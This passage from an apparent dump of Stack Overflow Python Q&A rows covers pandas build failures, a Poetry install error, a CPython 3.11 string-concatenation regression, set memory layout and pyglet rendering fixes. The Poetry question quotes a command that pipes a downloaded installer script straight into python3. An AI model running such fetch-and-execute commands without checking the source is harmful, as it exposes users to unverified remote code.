either. That should be the opt-in behaviour.</p>
<p>Raising an exception from str may prove to be too much, and could be
reconsidered, but we don’t see a feasible way to push out updates to
every user of int, so that will surely remain global.</p>
</blockquote>
"
"73708478","1","The git (or python) command requires the command line developer tools","<p><em>This knowledge post isn't a duplication of other similar ones, since it's related to 12/September/2022 Xcode update, which demands a different kind of solution</em></p>
<p>I have come to my computer today and discovered that nothing runs on my terminal Every time I have opened my IDE (VS Code or PyCharm), it has given me this message in the start of the terminal.</p>
<p>I saw so many solutions, which have said to uninstall <code>pyenv</code> and install python via brew, which was a terrible idea, because I need different python versions for different projects.</p>
<p>Also, people spoke a lot about symlinks, which as well did not make any sense, because everything was working until yesterday.</p>
<p>Furthermore, overwriting <code>.oh-my-zsh</code> with a new built one did not make any difference.</p>
","73709260","<p>I was prompted to reinstall commandLine tools over and over when trying to accept the terms</p>
<p>I FIXED this by opening xcode and confirming the new update information</p>
"
"72401377","1","ERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects","<p>I'm trying to install pandas via <code>pip install pandas</code> on my laptop.</p>
<p>Environment:</p>
<ul>
<li>Window 11 Pro</li>
<li>Python 3.10.4</li>
<li>Pip version 22.0.4</li>
</ul>
<p>Compatibility:</p>
<ul>
<li><a href=""https://pandas.pydata.org/pandas-docs/stable/getting_started/install.html#python-version-support"" rel=""nofollow noreferrer"">Officially Python 3.8, 3.9 and 3.10.</a></li>
<li><a href=""https://pandas.pydata.org/pandas-docs/stable/getting_started/install.html#installing-from-pypi"" rel=""nofollow noreferrer"">You must have pip&gt;=19.3 to install from PyPI.</a></li>
</ul>
<h1></h1>
<pre><code>C:\Users\PC&gt;pip install pandas
WARNING: Ignoring invalid distribution -ywin32 (c:\users\pc\appdata\local\programs\python\python310-32\lib\site-packages)
WARNING: Ignoring invalid distribution -ywin32 (c:\users\pc\appdata\local\programs\python\python310-32\lib\site-packages)
Collecting pandas
  Using cached pandas-1.4.2.tar.gz (4.9 MB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Requirement already satisfied: numpy&gt;=1.21.0 in c:\users\pc\appdata\local\programs\python\python310-32\lib\site-packages (from pandas) (1.22.4)
Requirement already satisfied: python-dateutil&gt;=2.8.1 in c:\users\pc\appdata\local\programs\python\python310-32\lib\site-packages (from pandas) (2.8.2)
Collecting pytz&gt;=2020.1
  Using cached pytz-2022.1-py2.py3-none-any.whl (503 kB)
Requirement already satisfied: six&gt;=1.5 in c:\users\pc\appdata\local\programs\python\python310-32\lib\site-packages (from python-dateutil&gt;=2.8.1-&gt;pandas) (1.16.0)
Building wheels for collected packages: pandas
  Building wheel for pandas (pyproject.toml) ... error
  error: subprocess-exited-with-error

  × Building wheel for pandas (pyproject.toml) did not run successfully.
  │ exit code: 1
  ╰─&gt; [2010 lines of output]
      C:\Users\PC\AppData\Local\Temp\pip-build-env-q3kdt5nb\overlay\Lib\site-packages\setuptools\config\setupcfg.py:459: SetuptoolsDeprecationWarning: The license_file parameter is deprecated, use license_files instead.
        warnings.warn(msg, warning_class)
</code></pre>
<blockquote>
<p>...</p>
</blockquote>
<h1></h1>
<pre><code>  note: This error originates from a subprocess, and is likely not a problem with pip.
  ERROR: Failed building wheel for pandas
Failed to build pandas
ERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects
</code></pre>
<p>What I have tried:</p>
<ul>
<li>updated pip to 22.1.1</li>
<li>installed wheel 0.37.1</li>
<li>uninstalled and installed pip</li>
<li>uninstalled and installed python 3.10.4</li>
</ul>
<hr />
<p>Error still reproducible with <a href=""https://github.com/pandas-dev/pandas/releases/tag/v1.5.1"" rel=""nofollow noreferrer"">pandas 1.5.1</a></p>
<hr />
<p><strong>Thanks to @<a href=""https://stackoverflow.com/users/51685/akx"">AKX</a> which has pointed up that there is no and may will no 32-bit version of pandas in the future. <a href=""https://github.com/pandas-dev/pandas/issues/44453"" rel=""nofollow noreferrer"">See the discussion on GitHub</a>.</strong></p>
","74277465","<p>Pandas doesn't require Anaconda to work, but based on <code>python310-32</code> in your output, you're using a 32-bit build of Python.</p>
<p>Pandas <a href=""https://pypi.org/project/pandas/1.5.1/#files"" rel=""nofollow noreferrer"">evidently</a> does not ship 32-bit wheels for Python 3.10 (they do have win32 wheels for Python 3.8 and Python 3.9 though). (There could be alternate sources for pre-built 32-bit wheels, such as <a href=""https://www.lfd.uci.edu/%7Egohlke/pythonlibs/#pandas"" rel=""nofollow noreferrer"">Gohlke's site</a>.)</p>
<p>In other words, on that platform you would need to install Pandas from source, which will likely be a rather difficult undertaking, and can't be done directly within <code>pip</code> anyway (as you noticed via <code>error: metadata-generation-failed</code>).</p>
<p>If your system is capable of running 64-bit Python, you should switch to it.</p>
"
"73805879","1","poetry installation failing on Mac OS, says ""should_use_symlinks""","<p>I am trying to install poetry using the following command</p>
<pre><code>curl -sSL https://install.python-poetry.org | python3 -
</code></pre>
<p>but it is failing with the following exception:</p>
<p><em>Exception: This build of python cannot create venvs without using symlinks</em></p>
<p>Below is the text detailing the error</p>
<pre><code>Retrieving Poetry metadata

# Welcome to Poetry!

This will download and install the latest version of Poetry,
a dependency and package manager for Python.

It will add the `poetry` command to Poetry's bin directory, located at:

/Users/DaftaryG/.local/bin

You can uninstall at any time by executing this script with the --uninstall option,
and these changes will be reverted.

Installing Poetry (1.2.1): Creating environment
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 940, in &lt;module&gt;
  File &quot;&lt;stdin&gt;&quot;, line 919, in main
  File &quot;&lt;stdin&gt;&quot;, line 550, in run
  File &quot;&lt;stdin&gt;&quot;, line 571, in install
  File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/contextlib.py&quot;, line 117, in __enter__
    return next(self.gen)
  File &quot;&lt;stdin&gt;&quot;, line 643, in make_env
  File &quot;&lt;stdin&gt;&quot;, line 629, in make_env
  File &quot;&lt;stdin&gt;&quot;, line 309, in make
  File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py&quot;, line 66, in __init__
    self.symlinks = should_use_symlinks(symlinks)
  File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py&quot;, line 31, in should_use_symlinks
    raise Exception(&quot;This build of python cannot create venvs without using symlinks&quot;)
Exception: This build of python cannot create venvs without using symlinks
</code></pre>
<p>I already have symlinks installed so not having that does not seem to be the problem. Would anyone know the cause of this error?</p>
","73834174","<p>Not the best solution, but you can install it using Homebrew, if you have it. That's what I did.</p>
<pre><code>brew install poetry
</code></pre>
"
"74605279","1","Python 3.11 worse optimized than 3.10?","<p>I run this simple loop with Python 3.10.7 and 3.11.0 on Windows 10.</p>
<pre><code>import time
a = 'a'

start = time.time()
for _ in range(1000000):
    a += 'a'
end = time.time()

print(a[:5], (end-start) * 1000)
</code></pre>
<p>The older version executes in 187ms, Python 3.11 needs about 17000ms. Does 3.10 realize that only the first 5 chars of <code>a</code> are needed, whereas 3.11 executes the whole loop? I confirmed this performance difference on godbolt.</p>
","74607850","<p><strong>TL;DR:</strong> you should not use such a loop in any performance critical code but <code>''.join</code> instead. The inefficient execution appears to be related to a regression during the bytecode generation in CPython 3.11 (and missing optimizations during the evaluation of binary add operation on Unicode strings).</p>
<hr />
<h2>General guidelines</h2>
<p>This is an <strong>antipattern</strong>. You should not write such a code if you want this to be fast. This is described in <a href=""https://peps.python.org/pep-0008/#programming-recommendations"" rel=""noreferrer"">PEP-8</a>:</p>
<blockquote>
<p>Code should be written in a way that does not disadvantage other implementations of Python (PyPy, Jython, IronPython, Cython, Psyco, and such). <br />
For example, <strong>do not rely on CPython’s efficient implementation of in-place string concatenation for statements in the form <code>a += b</code> or <code>a = a + b</code></strong>. This optimization is fragile even in CPython (it only works for some types) and isn’t present at all in implementations that don’t use refcounting. In performance sensitive parts of the library, the <strong><code>''.join()</code> form should be used instead</strong>. This will ensure that concatenation occurs in <em>linear time</em> across various implementations.</p>
</blockquote>
<p>Indeed, other implementations like PyPy does not perform an efficient in-place string concatenation for example. A new bigger string is created for every iteration (since strings are immutable, the previous one may be referenced and PyPy does not use a reference counting but a <a href=""https://doc.pypy.org/en/latest/gc_info.html"" rel=""noreferrer"">garbage collector</a>). This results in a quadratic runtime as opposed to a linear runtime in CPython (at least in past implementation).</p>
<hr />
<h2>Deep Analysis</h2>
<p>I can reproduce the problem on Windows 10 between the embedded (64-bit x86-64) version of CPython <a href=""https://www.python.org/ftp/python/3.10.8/python-3.10.8-embed-amd64.zip"" rel=""noreferrer"">3.10.8</a> and the one of <a href=""https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"" rel=""noreferrer"">3.11.0</a>:</p>
<pre><code>Timings:
 - CPython 3.10.8:    146.4 ms
 - CPython 3.11.0:  15186.8 ms
</code></pre>
<p>It turns out the code has not particularly changed between CPython 3.10 and 3.11 when it comes to Unicode string appending. See for example <code>PyUnicode_Append</code>: <a href=""https://github.com/python/cpython/blob/3.10/Objects/unicodeobject.c#L11809"" rel=""noreferrer"">3.10</a> and <a href=""https://github.com/python/cpython/blob/3.11/Objects/unicodeobject.c#L11476"" rel=""noreferrer"">3.11</a>.</p>
<p>A low-level profiling analysis shows that nearly all the time is spent in one unnamed function call of another unnamed function called by <code>PyUnicode_Concat</code> (which is also left unmodified between CPython 3.10.8 and 3.11.0). This slow unnamed function contains a pretty small set of assembly instructions and nearly all the time is spent in one unique x86-64 assembly instruction: <code>rep movsb byte ptr [rdi], byte ptr [rsi]</code>. This instruction is basically meant to copy a buffer pointed by the <code>rsi</code> register to a buffer pointed by the <code>rdi</code> register (the processor copy <code>rcx</code> bytes for the source buffer to the destination buffer and decrement the <code>rcx</code> register for each byte until it reach 0). This information shows that the unnamed function is actually <code>memcpy</code> of the standard MSVC C runtime (ie. CRT) which appears to be called by <code>_copy_characters</code> itself called by <code>_PyUnicode_FastCopyCharacters</code> of <code>PyUnicode_Concat</code> (all the functions are still belonging to the same file). However, these CPython functions are still left unmodified between CPython 3.10.8 and 3.11.0. The non-negligible time spent in malloc/free (about 0.3 seconds) seems to indicate that a lot of new string objects are created -- certainly at least 1 per iteration -- matching with the call to <code>PyUnicode_New</code> in the code of <code>PyUnicode_Concat</code>. All of this indicates that a new bigger string is created and copied as specified above.</p>
<p>The thing is calling <code>PyUnicode_Concat</code> is certainly the root of the performance issue here and I think CPython 3.10.8 is faster because it certainly calls <code>PyUnicode_Append</code> instead. Both calls are directly performed by the main big interpreter evaluation loop and this loop is driven by the generated bytecode.</p>
<p>It turns out that the <strong>generated bytecode is different between the two version and it is the root of the performance issue</strong>. Indeed, CPython 3.10 generates an <code>INPLACE_ADD</code> bytecode instruction while CPython 3.11 generates a  <code>BINARY_OP</code> bytecode instruction. Here is the bytecode for the loops in the two versions:</p>
<pre><code>CPython 3.10 loop:

        &gt;&gt;   28 FOR_ITER                 6 (to 42)
             30 STORE_NAME               4 (_)
  6          32 LOAD_NAME                1 (a)
             34 LOAD_CONST               2 ('a')
             36 INPLACE_ADD                             &lt;----------
             38 STORE_NAME               1 (a)
             40 JUMP_ABSOLUTE           14 (to 28)

CPython 3.11 loop:

        &gt;&gt;   66 FOR_ITER                 7 (to 82)
             68 STORE_NAME               4 (_)
  6          70 LOAD_NAME                1 (a)
             72 LOAD_CONST               2 ('a')
             74 BINARY_OP               13 (+=)         &lt;----------
             78 STORE_NAME               1 (a)
             80 JUMP_BACKWARD            8 (to 66)
</code></pre>
<p>This changes appears to come from <a href=""https://github.com/python/cpython/issues/89799"" rel=""noreferrer"">this issue</a>. The code of the main interpreter loop (see ceval.c) is different between the two CPython version. Here are the code executed by the two versions:</p>
<pre class=""lang-c prettyprint-override""><code>        // In CPython 3.10.8
        case TARGET(INPLACE_ADD): {
            PyObject *right = POP();
            PyObject *left = TOP();
            PyObject *sum;
            if (PyUnicode_CheckExact(left) &amp;&amp; PyUnicode_CheckExact(right)) {
                sum = unicode_concatenate(tstate, left, right, f, next_instr); // &lt;-----
                /* unicode_concatenate consumed the ref to left */
            }
            else {
                sum = PyNumber_InPlaceAdd(left, right);
                Py_DECREF(left);
            }
            Py_DECREF(right);
            SET_TOP(sum);
            if (sum == NULL)
                goto error;
            DISPATCH();
        }

//----------------------------------------------------------------------------

        // In CPython 3.11.0
        TARGET(BINARY_OP_ADD_UNICODE) {
            assert(cframe.use_tracing == 0);
            PyObject *left = SECOND();
            PyObject *right = TOP();
            DEOPT_IF(!PyUnicode_CheckExact(left), BINARY_OP);
            DEOPT_IF(Py_TYPE(right) != Py_TYPE(left), BINARY_OP);
            STAT_INC(BINARY_OP, hit);
            PyObject *res = PyUnicode_Concat(left, right); // &lt;-----
            STACK_SHRINK(1);
            SET_TOP(res);
            _Py_DECREF_SPECIALIZED(left, _PyUnicode_ExactDealloc);
            _Py_DECREF_SPECIALIZED(right, _PyUnicode_ExactDealloc);
            if (TOP() == NULL) {
                goto error;
            }
            JUMPBY(INLINE_CACHE_ENTRIES_BINARY_OP);
            DISPATCH();
        }
</code></pre>
<p>Note that <code>unicode_concatenate</code> calls <code>PyUnicode_Append</code> (and do some reference counting checks before). In the end, CPython 3.10.8 calls <code>PyUnicode_Append</code> which is fast (in-place) and CPython 3.11.0 calls <code>PyUnicode_Concat</code> which is slow (out-of-place). It clearly looks like a regression to me.</p>
<p>People in the comments reported having no performance issue on Linux. However, experimental tests shows a <code>BINARY_OP</code> instruction is also generated on Linux, and I cannot find so far any Linux-specific optimization regarding string concatenation. Thus, the difference between the platforms is pretty surprising.</p>
<hr />
<h2>Update: towards a fix</h2>
<p>I have opened an issue about this available <a href=""https://github.com/python/cpython/issues/99862"" rel=""noreferrer"">here</a>. One should not that <strong>putting the code in a function is significantly faster</strong> due to the variable being local (as pointed out by @Dennis in the comments).</p>
<hr />
<p>Related posts:</p>
<ul>
<li><a href=""https://stackoverflow.com/questions/3055477/how-slow-is-pythons-string-concatenation-vs-str-join"">How slow is Python&#39;s string concatenation vs. str.join?</a></li>
<li><a href=""https://stackoverflow.com/questions/1349311/python-string-join-is-faster-than-but-whats-wrong-here"">Python string &#39;join&#39; is faster (?) than &#39;+&#39;, but what&#39;s wrong here?</a></li>
<li><a href=""https://stackoverflow.com/questions/69556269/python-string-concatenation-in-for-loop-in-place"">Python string concatenation in for-loop in-place?</a></li>
</ul>
"
"74606984","1","How are small sets stored in memory?","<p>If we look at the resize behavior for sets under 50k elements:</p>
<pre><code>&gt;&gt;&gt; import sys
&gt;&gt;&gt; s = set()
&gt;&gt;&gt; seen = {}
&gt;&gt;&gt; for i in range(50_000):
...     size = sys.getsizeof(s)
...     if size not in seen:
...         seen[size] = len(s)
...         print(f&quot;{size=} {len(s)=}&quot;)
...     s.add(i)
... 
size=216 len(s)=0
size=728 len(s)=5
size=2264 len(s)=19
size=8408 len(s)=77
size=32984 len(s)=307
size=131288 len(s)=1229
size=524504 len(s)=4915
size=2097368 len(s)=19661
</code></pre>
<p>This pattern is consistent with <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L175-L177"" rel=""noreferrer"">quadrupling of the backing storage size once the set is 3/5ths full</a>, plus some presumably constant overhead for the <a href=""https://github.com/python/cpython/blob/v3.11.0/Include/cpython/setobject.h#L36-L59"" rel=""noreferrer""><code>PySetObject</code></a>:</p>
<pre><code>&gt;&gt;&gt; for i in range(9, 22, 2):
...     print(2**i + 216)
... 
728
2264
8408
32984
131288
524504
2097368
</code></pre>
<p>A similar pattern continues even for larger sets, but the resize factor switches to doubling instead of quadrupling.</p>
<p>The reported size for small sets is an outlier. Instead of size 344 bytes, i.e. 16 * 8 + 216 (the storage array of a newly created empty set has 8 slots avail until the first resize up to 32 slots) only 216 bytes is reported by <a href=""https://docs.python.org/3/library/sys.html#sys.getsizeof"" rel=""noreferrer""><code>sys.getsizeof</code></a>.</p>
<p>What am I missing? How are those small sets stored so that they use only 216 bytes instead of 344?</p>
","74612168","<p>The <code>set</code> object in Python is represented by the following C structure.</p>
<pre class=""lang-c prettyprint-override""><code>typedef struct {
    PyObject_HEAD

    Py_ssize_t fill;            /* Number of active and dummy entries*/
    Py_ssize_t used;            /* Number of active entries */

    /* The table contains mask + 1 slots, and that's a power of 2.
     * We store the mask instead of the size because the mask is more
     * frequently needed.
     */
    Py_ssize_t mask;

    /* The table points to a fixed-size smalltable for small tables
     * or to additional malloc'ed memory for bigger tables.
     * The table pointer is never NULL which saves us from repeated
     * runtime null-tests.
     */
    setentry *table;
    Py_hash_t hash;             /* Only used by frozenset objects */
    Py_ssize_t finger;          /* Search finger for pop() */

    setentry smalltable[PySet_MINSIZE];
    PyObject *weakreflist;      /* List of weak references */
} PySetObject;
</code></pre>
<p>Now remember, <code>getsizeof()</code> <a href=""https://docs.python.org/3/library/sys.html#sys.getsizeof"" rel=""nofollow noreferrer"">calls the object’s <code>__sizeof__</code> method and adds an additional garbage collector overhead if the object is managed by the garbage collector</a>.</p>
<p>Ok, <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L2071"" rel=""nofollow noreferrer""><code>set</code> implements the <code>__sizeof__</code></a>.</p>
<pre><code>static PyObject *
set_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))
{
    Py_ssize_t res;

    res = _PyObject_SIZE(Py_TYPE(so));
    if (so-&gt;table != so-&gt;smalltable)
        res = res + (so-&gt;mask + 1) * sizeof(setentry);
    return PyLong_FromSsize_t(res);
}
</code></pre>
<p>Now let’s inspect the line</p>
<pre class=""lang-c prettyprint-override""><code>res = _PyObject_SIZE(Py_TYPE(so));
</code></pre>
<p><a href=""https://github.com/python/cpython/blob/main/Include/cpython/objimpl.h#L5"" rel=""nofollow noreferrer""><code>_PyObject_SIZE</code> is just a macro</a> which expands to <code>(typeobj)-&gt;tp_basicsize</code>.</p>
<pre class=""lang-c prettyprint-override""><code>#define _PyObject_SIZE(typeobj) ( (typeobj)-&gt;tp_basicsize )
</code></pre>
<p>This code is essentially trying to access the <a href=""https://docs.python.org/3/c-api/typeobj.html#c.PyTypeObject.tp_basicsize"" rel=""nofollow noreferrer""><code>tp_basicsize</code> slot to get the size in bytes of instances of the type</a> which is just <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L2130"" rel=""nofollow noreferrer""><code>sizeof(PySetObject)</code> in case of <code>set</code></a>.</p>
<pre class=""lang-c prettyprint-override""><code>PyTypeObject PySet_Type = {
    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)
    &quot;set&quot;,                              /* tp_name */
    sizeof(PySetObject),                /* tp_basicsize */
    0,                                  /* tp_itemsize */
    # Skipped rest of the code for brevity.
</code></pre>
<p>I have modified the <code>set_sizeof</code> C function with the following changes.</p>
<pre class=""lang-c prettyprint-override""><code>static PyObject *
set_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))
{
    Py_ssize_t res;

    unsigned long py_object_head_size = sizeof(so-&gt;ob_base); // Because PyObject_HEAD expands to PyObject ob_base;
    unsigned long fill_size = sizeof(so-&gt;fill);
    unsigned long used_size = sizeof(so-&gt;used);
    unsigned long mask_size = sizeof(so-&gt;mask);
    unsigned long table_size = sizeof(so-&gt;table);
    unsigned long hash_size = sizeof(so-&gt;hash);
    unsigned long finger_size = sizeof(so-&gt;finger);
    unsigned long smalltable_size = sizeof(so-&gt;smalltable);
    unsigned long weakreflist_size = sizeof(so-&gt;weakreflist);
    int is_using_fixed_size_smalltables = so-&gt;table == so-&gt;smalltable;

    printf(&quot;| PySetObject Fields   | Size(bytes) |\n&quot;);
    printf(&quot;|------------------------------------|\n&quot;);
    printf(&quot;|    PyObject_HEAD     |     '%zu'    |\n&quot;, py_object_head_size);
    printf(&quot;|      fill            |      '%zu'    |\n&quot;, fill_size);
    printf(&quot;|      used            |      '%zu'    |\n&quot;, used_size);
    printf(&quot;|      mask            |      '%zu'    |\n&quot;, mask_size);
    printf(&quot;|      table           |      '%zu'    |\n&quot;, table_size);
    printf(&quot;|      hash            |      '%zu'    |\n&quot;, hash_size);
    printf(&quot;|      finger          |      '%zu'    |\n&quot;, finger_size);
    printf(&quot;|    smalltable        |    '%zu'    |\n&quot;, smalltable_size);
    printf(&quot;|    weakreflist       |      '%zu'    |\n&quot;, weakreflist_size);
    printf(&quot;-------------------------------------|\n&quot;);
    printf(&quot;|       Total          |    '%zu'    |\n&quot;, py_object_head_size+fill_size+used_size+mask_size+table_size+hash_size+finger_size+smalltable_size+weakreflist_size);
    printf(&quot;\n&quot;);
    printf(&quot;Total size of PySetObject '%zu' bytes\n&quot;, sizeof(PySetObject));
    printf(&quot;Has set resized: '%s'\n&quot;, is_using_fixed_size_smalltables ? &quot;No&quot;: &quot;Yes&quot;);
    if(!is_using_fixed_size_smalltables) {
        printf(&quot;Size of malloc'ed table: '%zu' bytes\n&quot;, (so-&gt;mask + 1) * sizeof(setentry));
    }

    res = _PyObject_SIZE(Py_TYPE(so));
    if (so-&gt;table != so-&gt;smalltable)
        res = res + (so-&gt;mask + 1) * sizeof(setentry);
    return PyLong_FromSsize_t(res);
}
</code></pre>
<p>and compiling and running these changes gives me</p>
<pre class=""lang-none prettyprint-override""><code>&gt;&gt;&gt; import sys
&gt;&gt;&gt;
&gt;&gt;&gt; set_ = set()
&gt;&gt;&gt; sys.getsizeof(set_)
| PySetObject Fields   | Size(bytes) |
|------------------------------------|
|    PyObject_HEAD     |     '16'    |
|      fill            |      '8'    |
|      used            |      '8'    |
|      mask            |      '8'    |
|      table           |      '8'    |
|      hash            |      '8'    |
|      finger          |      '8'    |
|    smalltable        |    '128'    |
|    weakreflist       |      '8'    |
-------------------------------------|
|       Total          |    '200'    |

Total size of PySetObject '200' bytes
Has set resized: 'No'
216
&gt;&gt;&gt; set_.add(1)
&gt;&gt;&gt; set_.add(2)
&gt;&gt;&gt; set_.add(3)
&gt;&gt;&gt; set_.add(4)
&gt;&gt;&gt; set_.add(5)
&gt;&gt;&gt; sys.getsizeof(set_)
| PySetObject Fields   | Size(bytes) |
|------------------------------------|
|    PyObject_HEAD     |     '16'    |
|      fill            |      '8'    |
|      used            |      '8'    |
|      mask            |      '8'    |
|      table           |      '8'    |
|      hash            |      '8'    |
|      finger          |      '8'    |
|    smalltable        |    '128'    |
|    weakreflist       |      '8'    |
-------------------------------------|
|       Total          |    '200'    |

Total size of PySetObject '200' bytes
Has set resized: 'Yes'
Size of malloc'ed table: '512' bytes
728
</code></pre>
<p>The return value is 216/728 bytes because <a href=""https://github.com/python/cpython/blob/v3.11.0/Python/sysmodule.c#L1703"" rel=""nofollow noreferrer""><code>sys.getsize</code> add <code>16</code> bytes of GC overhead</a>.</p>
<p>But the important thing to note here is this line.</p>
<pre class=""lang-none prettyprint-override""><code>|    smalltable        |    '128'    |
</code></pre>
<p>Because for small tables(before the first resize) <code>so-&gt;table</code> is just <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L964"" rel=""nofollow noreferrer"">a reference</a> to <a href=""https://github.com/python/cpython/blob/02f72b8b938e301bbaaf0142547014e074bd564c/Include/cpython/setobject.h#L57"" rel=""nofollow noreferrer"">fixed size(<code>8</code>) <code>so-&gt;smalltable</code></a>(No malloc'ed memory) so <code>sizeof(PySetObject)</code> is sufficient enough to get the size because it also includes the storage size( <code>128(16(size of setentry) * 8)</code>).</p>
<p>Now what happens when the resize occurs? It constructs <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L274-L285"" rel=""nofollow noreferrer"">entirely new table (malloc'ed)</a> and uses <a href=""https://github.com/python/cpython/blob/v3.11.0/Objects/setobject.c#L285"" rel=""nofollow noreferrer"">that table instead</a> of <code>so-&gt;smalltables</code>. This means that the sets, which have resized, also carry out a dead-weight of 128 bytes (size of <a href=""https://github.com/python/cpython/blob/02f72b8b938e301bbaaf0142547014e074bd564c/Include/cpython/setobject.h#L57"" rel=""nofollow noreferrer"">fixed size small table</a>) along with the size of malloc'ed <code>so-&gt;table</code>.</p>
<pre class=""lang-c prettyprint-override""><code>else {
        newtable = PyMem_NEW(setentry, newsize);
        if (newtable == NULL) {
            PyErr_NoMemory();
            return -1;
        }
    }

    /* Make the set empty, using the new table. */
    assert(newtable != oldtable);
    memset(newtable, 0, sizeof(setentry) * newsize);
    so-&gt;mask = newsize - 1;
    so-&gt;table = newtable;
</code></pre>
"
"74314778","1","NameError: name 'glPushMatrix' is not defined","<p>Try to run a test code for stable baselines gym</p>
<pre><code>import gym

from stable_baselines3 import A2C

env = gym.make(&quot;CartPole-v1&quot;)

model = A2C(&quot;MlpPolicy&quot;, env, verbose=1)
model.learn(total_timesteps=10_000)

obs = env.reset()
for i in range(100):
    action, _state = model.predict(obs, deterministic=True)
    obs, reward, done, info = env.step(action)
    env.render()
    if done:
      obs = env.reset()
</code></pre>
<p>found the error &quot;NameError: name 'glPushMatrix' is not defined&quot;</p>
<pre><code>Traceback (most recent call last):
  File &quot;test_cart_pole.py&quot;, line 14, in &lt;module&gt;
    env.render()
  File &quot;/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/core.py&quot;, line 295, in render
    return self.env.render(mode, **kwargs)
  File &quot;/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/cartpole.py&quot;, line 229, in render
    return self.viewer.render(return_rgb_array=mode == &quot;rgb_array&quot;)
  File &quot;/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py&quot;, line 126, in render
    self.transform.enable()
  File &quot;/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py&quot;, line 232, in enable
    glPushMatrix()
NameError: name 'glPushMatrix' is not defined
</code></pre>
<p>I  tried  &quot;pip install PyOpenGL PyOpenGL_accelerate&quot;, which didn't help
also uninstall pyglet and install again , did't work too
Any Idea???</p>
","74324578","<p>Just had the same problem. Fixed it by installing an older version of pyglet:</p>
<pre><code>$ pip install pyglet==1.5.27
</code></pre>
<p>I don't know if this is the latest version that avoids the problem, but it works.</p>
"
"73144451","1","ModuleNotFoundError: No module named 'setuptools.command.build'","<p>I am trying to pip install sentence transformers. I am working on a Macbook pro with an M1 chip. I am using the following command:</p>
<blockquote>
<p>pip3 install -U sentence-transformers</p>
</blockquote>
<p>When I run this, I get this error/output and I do not know how to fix it...</p>
<pre><code>Defaulting to user installation because normal site-packages is not writeable
Collecting sentence-transformers
  Using cached sentence-transformers-2.2.2.tar.gz (85 kB)
  Preparing metadata (setup.py) ... done
Collecting transformers&lt;5.0.0,&gt;=4.6.0
  Using cached transformers-4.21.0-py3-none-any.whl (4.7 MB)
Collecting tqdm
  Using cached tqdm-4.64.0-py2.py3-none-any.whl (78 kB)
Requirement already satisfied: torch&gt;=1.6.0 in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.12.0)
Collecting torchvision
  Using cached torchvision-0.13.0-cp38-cp38-macosx_11_0_arm64.whl (1.2 MB)
Requirement already satisfied: numpy in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.23.1)
Collecting scikit-learn
  Using cached scikit_learn-1.1.1-cp38-cp38-macosx_12_0_arm64.whl (7.6 MB)
Collecting scipy
  Using cached scipy-1.8.1-cp38-cp38-macosx_12_0_arm64.whl (28.6 MB)
Collecting nltk
  Using cached nltk-3.7-py3-none-any.whl (1.5 MB)
Collecting sentencepiece
  Using cached sentencepiece-0.1.96.tar.gz (508 kB)
  Preparing metadata (setup.py) ... done
Collecting huggingface-hub&gt;=0.4.0
  Using cached huggingface_hub-0.8.1-py3-none-any.whl (101 kB)
Collecting requests
  Using cached requests-2.28.1-py3-none-any.whl (62 kB)
Collecting pyyaml&gt;=5.1
  Using cached PyYAML-6.0.tar.gz (124 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Requirement already satisfied: typing-extensions&gt;=3.7.4.3 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub&gt;=0.4.0-&gt;sentence-transformers) (4.3.0)
Requirement already satisfied: filelock in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub&gt;=0.4.0-&gt;sentence-transformers) (3.7.1)
Requirement already satisfied: packaging&gt;=20.9 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub&gt;=0.4.0-&gt;sentence-transformers) (21.3)
Collecting tokenizers!=0.11.3,&lt;0.13,&gt;=0.11.1
  Using cached tokenizers-0.12.1.tar.gz (220 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... error
  error: subprocess-exited-with-error
  
  × Getting requirements to build wheel did not run successfully.
  │ exit code: 1
  ╰─&gt; [20 lines of output]
      Traceback (most recent call last):
        File &quot;/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 363, in &lt;module&gt;
          main()
        File &quot;/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 345, in main
          json_out['return_val'] = hook(**hook_input['kwargs'])
        File &quot;/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 130, in get_requires_for_build_wheel
          return hook(config_settings)
        File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 146, in get_requires_for_build_wheel
          return self._get_build_requires(
        File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 127, in _get_build_requires
          self.run_setup()
